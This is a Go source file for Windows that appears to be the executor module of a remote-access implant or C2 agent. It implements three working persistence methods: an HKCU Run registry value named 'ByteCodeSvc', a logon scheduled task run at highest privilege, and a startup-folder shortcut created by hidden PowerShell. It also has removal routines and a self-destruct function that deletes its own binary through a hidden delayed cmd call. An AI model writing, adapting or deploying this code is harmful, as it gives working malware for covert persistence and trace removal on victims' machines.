//go:build windows
package executor

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"unsafe"
)

func addPersistence(payload interface{}) (string, error) {
	payloadMap, ok := toMap(payload)
	method := "registry"
	if ok {
		if m, ok := payloadMap["method"].(string); ok {
			method = m
		}
	}

	exePath, _ := os.Executable()

	switch method {
	case "registry":
		return persistRegistry(exePath)
	case "schtask":
		return persistScheduledTask(exePath)
	case "startup":
		return persistStartupFolder(exePath)
	default:
		return "", fmt.Errorf("unknown method: %s (use: registry, schtask, startup)", method)
	}
}

func removePersistence(payload interface{}) (string, error) {
	payloadMap, ok := toMap(payload)
	method := "registry"
	if ok {
		if m, ok := payloadMap["method"].(string); ok {
			method = m
		}
	}

	switch method {
	case "registry":
		return removeRegistryPersistence()
	case "schtask":
		return removeScheduledTaskPersistence()
	case "startup":
		return removeStartupPersistence()
	default:
		return "", fmt.Errorf("unknown method: %s", method)
	}
}

func persistRegistry(exePath string) (string, error) {
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	regOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
	regSetValueEx := advapi32.NewProc("RegSetValueExW")
	regCloseKey := advapi32.NewProc("RegCloseKey")

	keyPath, _ := syscall.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\Run`)
	valueName, _ := syscall.UTF16PtrFromString("ByteCodeSvc")
	valueData, _ := syscall.UTF16FromString(exePath)

	var hKey uintptr
	ret, _, err := regOpenKeyEx.Call(0x80000001, uintptr(unsafe.Pointer(keyPath)), 0, 0x20006, uintptr(unsafe.Pointer(&hKey)))
	if ret != 0 {
		return "", fmt.Errorf("RegOpenKeyEx failed: %v", err)
	}
	defer regCloseKey.Call(hKey)

	dataBytes := len(valueData) * 2
	ret, _, err = regSetValueEx.Call(hKey, uintptr(unsafe.Pointer(valueName)), 0, 1, uintptr(unsafe.Pointer(&valueData[0])), uintptr(dataBytes))
	if ret != 0 {
		return "", fmt.Errorf("RegSetValueEx failed: %v", err)
	}

	return fmt.Sprintf("Registry persistence installed at HKCU\\...\\Run\\ByteCodeSvc -> %s", exePath), nil
}

func removeRegistryPersistence() (string, error) {
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	regOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
	regDeleteValue := advapi32.NewProc("RegDeleteValueW")
	regCloseKey := advapi32.NewProc("RegCloseKey")

	keyPath, _ := syscall.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\Run`)
	valueName, _ := syscall.UTF16PtrFromString("ByteCodeSvc")

	var hKey uintptr
	ret, _, _ := regOpenKeyEx.Call(0x80000001, uintptr(unsafe.Pointer(keyPath)), 0, 0x20006, uintptr(unsafe.Pointer(&hKey)))
	if ret != 0 {
		return "", fmt.Errorf("registry key not found")
	}
	defer regCloseKey.Call(hKey)

	ret, _, _ = regDeleteValue.Call(hKey, uintptr(unsafe.Pointer(valueName)))
	if ret != 0 {
		return "", fmt.Errorf("failed to delete registry value")
	}
	return "Registry persistence removed", nil
}

func persistScheduledTask(exePath string) (string, error) {
	cmd := exec.Command("schtasks", "/create", "/tn", "ByteCodeService",
		"/tr", exePath, "/sc", "onlogon", "/rl", "highest", "/f")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("schtasks failed: %s", string(out))
	}
	return fmt.Sprintf("Scheduled task created: ByteCodeService -> %s", exePath), nil
}

func removeScheduledTaskPersistence() (string, error) {
	cmd := exec.Command("schtasks", "/delete", "/tn", "ByteCodeService", "/f")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("failed: %s", string(out))
	}
	return "Scheduled task removed", nil
}

func persistStartupFolder(exePath string) (string, error) {
	appData := os.Getenv("APPDATA")
	startupDir := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	linkName := filepath.Join(startupDir, "ByteCodeSvc.lnk")

	psCmd := fmt.Sprintf(`$s=(New-Object -ComObject WScript.Shell).CreateShortcut('%s');$s.TargetPath='%s';$s.Save()`, linkName, exePath)
	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", psCmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("failed: %s %v", string(out), err)
	}
	return fmt.Sprintf("Startup shortcut created: %s", linkName), nil
}

func removeStartupPersistence() (string, error) {
	appData := os.Getenv("APPDATA")
	linkName := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "ByteCodeSvc.lnk")
	if err := os.Remove(linkName); err != nil {
		return "", fmt.Errorf("failed: %w", err)
	}
	return "Startup shortcut removed", nil
}

func selfDestruct() (string, error) {
	exePath, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("failed to get exe path: %w", err)
	}

	os.Remove(".bytecode_id")

	cmd := exec.Command("cmd", "/C", "ping", "127.0.0.1", "-n", "3", ">", "nul", "&", "del", "/f", exePath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Start()

	result := fmt.Sprintf("Self-destruct initiated. Binary: %s", exePath)
	return result, nil
}
